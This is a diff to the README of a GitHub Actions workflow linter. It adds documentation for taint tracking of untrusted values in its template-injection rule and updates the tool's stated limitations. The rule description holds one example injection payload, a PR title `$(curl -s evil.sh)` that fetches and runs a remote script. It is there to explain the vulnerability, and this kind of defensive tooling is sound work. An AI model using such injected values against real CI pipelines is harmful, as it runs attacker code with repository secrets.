@@ -25,7 +25,7 @@ deliberately small and readable: one file per concern, every rule explained belo
 | WG001 | unpinned-action | low for `actions/*`, `github/*`; high for other owners; medium for Docker tags | `uses:` with a tag or branch (`@v4`, `@main`), a short SHA, or no version. A tag can be moved to malicious code after you've reviewed it; a full 40-character commit SHA can't. Covers steps and reusable workflows (`jobs.<id>.uses`). |
 | WG002 | missing-permissions | medium | No `permissions:` at the top and at least one job without its own. The token then gets the repository's default, which may be read/write for everything. |
 | WG003 | write-all | high | `permissions: write-all` at workflow or job level. |
-| WG004 | template-injection | high | `${{ github.event.pull_request.title }}` and other outsider-controlled values (issue/PR/comment text, branch names, commit messages) inside `run:` or `actions/github-script`. The value is pasted into the script before it runs, so a PR titled `$(curl -s evil.sh)` downloads and runs that script. Pass it through `env:` and use `"$TITLE"` instead. In a composite action, `${{ inputs.* }}` in `run:` is reported too (medium): the calling workflow may pass untrusted text. |
+| WG004 | template-injection | high | `${{ github.event.pull_request.title }}` and other outsider-controlled values (issue/PR/comment text, branch names, commit messages) inside `run:` or `actions/github-script`. The value is pasted into the script before it runs, so a PR titled `$(curl -s evil.sh)` downloads and runs that script. Pass it through `env:` and use `"$TITLE"` instead. In a composite action, `${{ inputs.* }}` in `run:` is reported too (medium): the calling workflow may pass untrusted text. Detours are followed too: `env:`, `$GITHUB_ENV`, `$GITHUB_OUTPUT` and job outputs (see below). |
 | WG005 | pull-request-target | low, or high with a PR checkout | `pull_request_target` runs with secrets even for pull requests from forks. Checking out the PR's head (`ref: ${{ github.event.pull_request.head.sha }}`, or a `refs/pull/...` ref) then runs a stranger's code with those secrets. |
 | WG006 | persisted-credentials | low | `actions/checkout` without `persist-credentials: false` leaves the token in `.git/config`, readable by every later step. |
 
@@ -245,6 +245,20 @@ be read or parsed, or bad arguments.
   `'github.head_ref'` is text, not a context, and a `}}` inside it doesn't end the expression.
   `toJSON(github.event)` is reported too: it prints every field, titles and bodies included.
   The paths are then compared with a list of outsider-controlled fields.
+- WG004 also follows untrusted values on a **detour** (`taint.py`). The steps of each job are
+  walked in order, like the runner does, keeping track of which values are *tainted*:
+  `env:` at workflow, job and step level (a clean value at a lower level removes the taint),
+  `NAME=value >> $GITHUB_ENV` (later steps), `name=value >> $GITHUB_OUTPUT` in a step with an
+  `id` (`steps.<id>.outputs.<name>`), and job `outputs:` (`needs.<job>.outputs.<name>`, in any
+  job order). A value is tainted if an expression in it is, or, in a script, if it uses a
+  shell variable holding a tainted value. The message spells the detour out:
+
+  ```
+  'steps.meta.outputs.title' carries 'github.event.pull_request.title', which outsiders can set
+  (via env.TITLE (step 'meta') -> steps.meta.outputs.title) and is pasted into a script; ...
+  ```
+
+  `"$TITLE"` in the script stays fine: the shell reads the variable, nothing is pasted.
   For `run: |` blocks the line of the expression itself is reported, not the `run:` line.
 - `--format github` prints [workflow commands](https://docs.github.com/en/actions/reference/workflows-and-actions/workflow-commands).
   Messages and properties are percent-encoded the way the runner expects (`%`, `\r`, `\n`, and
@@ -256,6 +270,7 @@ src/workflow_guard/
   workflow.py  loading workflows and actions, node helpers, jobs/steps/triggers, inline ignores
   rules.py     the six rules
   expressions.py  ${{ }} lexer and context paths (used by WG004 and WG005)
+  taint.py     WG004's tracker: untrusted values through env:, $GITHUB_ENV/OUTPUT, job outputs
   fix.py       --fix: GitHubResolver (API lookups), pin_actions (text edits), comment style
   sarif.py     --format sarif: rules, results, fingerprints, notifications
   annotations.py --format github: workflow commands, with GitHub's escaping
@@ -283,8 +298,10 @@ Ubuntu and Windows.
 - The expression reader only extracts property paths; it doesn't evaluate expressions or check
   operator precedence. A computed key (`github.event[matrix.field].title`) can't be resolved,
   so it isn't reported.
-- Values passed through other steps' outputs (`steps.x.outputs.title` set from a PR title)
-  aren't traced; only direct uses of untrusted contexts are reported.
+- The detour tracking reads `>> $GITHUB_ENV` / `>> $GITHUB_OUTPUT` one line at a time: multi-line
+  values (`name<<EOF` heredocs), `{ ...; } >> $GITHUB_OUTPUT` groups, `tee`, other shells' syntax
+  and outputs set by actions (e.g. github-script's `core.setOutput`) aren't followed. Neither
+  are outputs of reusable workflows or composite actions as seen by their callers.
 - The inside of called reusable workflows and of remote actions (`uses: owner/repo@sha`)
   isn't checked; only files in the repository being checked are.
 - `.github/actions` is searched for `action.yml` at any depth, but other places for local
